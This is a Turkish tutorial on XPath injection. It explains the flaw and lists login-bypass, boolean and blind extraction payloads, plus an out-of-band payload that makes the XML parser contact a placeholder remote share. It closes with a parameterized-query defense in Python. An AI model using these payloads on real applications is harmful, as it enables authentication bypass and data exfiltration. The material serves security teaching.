# XPATH Injection Nedir
XPATH Injection, web uygulamalarının XML veri kaynaklarına yaptığı sorguların kullanıcı girdisiyle manipüle edilmesiyle oluşan bir güvenlik açığıdır. SQL Injection’a benzer ama hedef XML/XPATH sorgularıdır. Bu açık, özellikle legacy sistemlerde, SOAP API’lerde veya XML tabanlı login formlarında görülür.

# XPATH Sorguları ve Yapısı

Bir XPATH sorgusu genellikle XML elemanlarını ve değerlerini hedefler. Örnek bir kullanıcı doğrulama sorgusu:
```xpath
//users/user[username/text()='$inputUsername' and password/text()='$inputPassword']
```

- $inputUsername ve $inputPassword kullanıcı girdileridir.
- Eğer bu girdiler filtrelenmezse, saldırgan sorguyu manipüle edebilir.

Örnek kötü niyetli giriş:
```xpath
Username: ' or '1'='1
Password: ' or '1'='1
```

Bu giriş, sorgunun tüm kullanıcıları döndürmesine yol açar.

## Boolean-Based XPATH Injection
Sorgu sonucunu true/false üzerinden manipüle eder.

Örnek payload:
```xpath
' or '1'='1
' or '1'='2
```

True sonucu dönerse, kullanıcıya özel bilgi elde edilebilir.

## Basit ve Boolean-Based Payloadlar
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

## Blind Exploitation Teknikleri
String uzunluğunu sorgulama:
```xpath
and string-length(account)=SIZE_INT
```

Belirli karakteri alma ve doğrulama:
```xpath
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

## Out-of-Band (OOB) Exploitation
XML parser’ı ile uzak bir sunucuya veri sızdırma:
```
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

Bu örnekler, XPATH Injection’ın SQLi mantığıyla çok benzer şekilde sömürülebileceğini gösterir.

# XPATH Injection’dan Korunmak
## Parametrized XPATH Queries
```py
from lxml import etree

# Kullanıcı girdileri
inputUsername = request.POST.get('username')
inputPassword = request.POST.get('password')

# XML dosyasını oku
tree = etree.parse("users.xml")

# Parametrized XPATH kullanımı
xpath_expr = "//users/user[username/text()=$username and password/text()=$password]"
result = tree.xpath(xpath_expr, username=inputUsername, password=inputPassword)

if result:
    print("Login successful")
else:
    print("Login failed")
```